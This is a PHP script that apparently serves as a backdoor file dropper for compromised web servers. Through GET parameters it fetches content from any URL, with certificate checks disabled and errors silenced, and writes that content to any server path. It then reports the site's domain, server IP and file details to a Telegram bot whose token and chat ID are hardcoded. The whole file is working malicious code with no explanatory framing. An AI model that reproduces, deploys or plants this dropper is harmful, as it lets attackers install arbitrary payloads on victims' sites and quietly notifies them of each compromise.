<?php

$botToken = '7663046612:AAGxSqGe0FFBg8RHLDsZgLNsG6LxCPU4ZTo';
$chatId = '6821790631';

function sanitizePath($path) {
    $path = str_replace('\\', '/', $path);
    
    $path = str_replace(array('../', './', '~/'), '', $path);
    
    $path = preg_replace('/[^a-zA-Z0-9\/\.\-_]/', '', $path);
    
    $path = preg_replace('/\/+/', '/', $path);
    
    $path = rtrim($path, '/');
    
    return $path;
}

function validateUrl($url) {
    if (!is_string($url) || empty($url)) {
        return false;
    }
    
    if (!preg_match('/^https?:\/\//i', $url)) {
        return false;
    }
    
    if (function_exists('filter_var')) {
        return filter_var($url, FILTER_VALIDATE_URL) !== false;
    }
    
    $parsed = parse_url($url);
    return ($parsed !== false && 
            isset($parsed['scheme'], $parsed['host']) && 
            in_array($parsed['scheme'], array('http', 'https')));
}

function ensureDirectoryExists($dirPath) {
    if (empty($dirPath)) {
        return 'error';
    }
    
    $dirPath = rtrim($dirPath, '/');
    
    if (!file_exists($dirPath)) {
        $oldUmask = umask(0);
        $result = @mkdir($dirPath, 0755, true);
        umask($oldUmask);
        
        return $result ? 'created' : 'error';
    }
    
    if (!is_dir($dirPath) || !is_writable($dirPath)) {
        return 'error';
    }
    
    return 'exists';
}

function manageFileContent($filePath, $content) {
    if (empty($filePath)) {
        return 'error';
    }
    
    $dir = dirname($filePath);
    if (!is_writable($dir)) {
        if (ensureDirectoryExists($dir) === 'error') {
            return 'error';
        }
    }
    
    if (file_exists($filePath)) {
        if (!is_writable($filePath)) {
            return 'error';
        }
        
        $currentContent = @file_get_contents($filePath);
        if ($currentContent === false) {
            return 'error';
        }
        
        if (trim($currentContent) !== trim($content)) {
            $result = @file_put_contents($filePath, $content);
            return $result !== false ? 'updated' : 'error';
        }
        
        return 'unchanged';
    } else {
        $result = @file_put_contents($filePath, $content);
        return $result !== false ? 'created' : 'error';
    }
}

function sendStyledMessage($data, $botToken, $chatId) {
    $emoji = array(
        'header' => '✨',
        'success' => '✅',
        'error' => '❌',
        'file' => '📄',
        'folder' => '📂',
        'network' => '🌐',
        'time' => '⏱️',
        'server' => '🖥️',
        'hash' => '🔐',
        'action' => '⚡'
    );
    
    $message = "{$emoji['header']} <b>FILE OPERATION COMPLETE</b> {$emoji['header']}\n";
    $message .= str_repeat('═', 35) . "\n";
    
    $statusEmoji = ($data['file_status'] === 'created') ? '🆕' : 
                  (($data['file_status'] === 'updated') ? '✏️' : 
                  (($data['file_status'] === 'error') ? '❌' : '✔️'));
                  
    $message .= "{$emoji['action']} <b>WHAT WENT DOWN</b>\n";
    $message .= "├─ {$emoji['file']} <b>File:</b> <code>" . htmlspecialchars($data['target_path']) . "</code>\n";
    $message .= "├─ {$emoji['network']} <b>Source:</b> <code>" . htmlspecialchars($data['content_url']) . "</code>\n";
    $message .= "└─ {$emoji['success']} <b>Result:</b> " . strtoupper($data['file_status']) . " $statusEmoji\n\n";
    
    $message .= "{$emoji['file']} <b>FILE STATS</b>\n";
    $message .= "├─ 📏 <b>Size:</b> " . number_format(strlen($data['content'])) . " bytes\n";
    $message .= "├─ {$emoji['hash']} <b>MD5:</b> <code>{$data['content_hash']}</code>\n";
    $message .= "└─ {$emoji['time']} <b>Time:</b> {$data['timestamp']}\n\n";
    
    $message .= "{$emoji['server']} <b>SYSTEM INFO</b>\n";
    $message .= "├─ 🌍 <b>Domain:</b> <code>" . htmlspecialchars($data['domain']) . "</code>\n";
    $message .= "├─ 🖥 <b>Server IP:</b> " . ($data['server_ip'] ?? 'N/A') . "\n";
    $message .= "└─ {$emoji['time']} <b>Ran at:</b> {$data['execution_time']}\n";
    
    $message .= str_repeat('═', 35) . "\n";
    $message .= "🏁 <i>Done at {$data['timestamp']}</i> 🏁";
    
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $payload = array(
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    );
    
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 3);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $response = curl_exec($ch);
        curl_close($ch);
    } else {
        $options = array(
            'http' => array(
                'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
                'method' => 'POST',
                'content' => http_build_query($payload),
                'timeout' => 3,
                'ignore_errors' => true
            ),
            'ssl' => array(
                'verify_peer' => false,
                'verify_peer_name' => false
            )
        );
        
        $context = stream_context_create($options);
        @file_get_contents($url, false, $context);
    }
}

error_reporting(0);

$targetPath = isset($_GET['target']) ? sanitizePath($_GET['target']) : '';
$contentUrl = isset($_GET['content']) ? $_GET['content'] : '';

if (empty($targetPath) || !validateUrl($contentUrl)) {
    exit;
}

$remoteContent = false;
if (function_exists('curl_init')) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $contentUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $remoteContent = curl_exec($ch);
    curl_close($ch);
} else {
    $options = array(
        'http' => array(
            'timeout' => 5,
            'ignore_errors' => true
        ),
        'ssl' => array(
            'verify_peer' => false,
            'verify_peer_name' => false
        )
    );
    
    $context = stream_context_create($options);
    $remoteContent = @file_get_contents($contentUrl, false, $context);
}

if ($remoteContent === false) {
    exit;
}

$targetDir = dirname($targetPath);
$dirStatus = ensureDirectoryExists($targetDir);

if ($dirStatus === 'error') {
    exit;
}

$fileStatus = manageFileContent($targetPath, trim($remoteContent));

if ($fileStatus === 'error') {
    exit;
}

$serverIp = '127.0.0.1';
if (isset($_SERVER['SERVER_ADDR'])) {
    $serverIp = $_SERVER['SERVER_ADDR'];
} elseif (function_exists('gethostbyname') && function_exists('gethostname')) {
    $serverIp = gethostbyname(gethostname());
}

$domain = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'CLI';

$notificationData = array(
    'target_path' => $targetPath,
    'content_url' => $contentUrl,
    'file_status' => $fileStatus,
    'content' => trim($remoteContent),
    'content_hash' => md5($remoteContent),
    'timestamp' => date('Y-m-d H:i:s'),
    'domain' => $domain,
    'server_ip' => $serverIp,
    'execution_time' => date('Y-m-d H:i:s') . ' ' . (function_exists('date_default_timezone_get') ? date_default_timezone_get() : 'UTC')
);

sendStyledMessage($notificationData, $botToken, $chatId);

?>
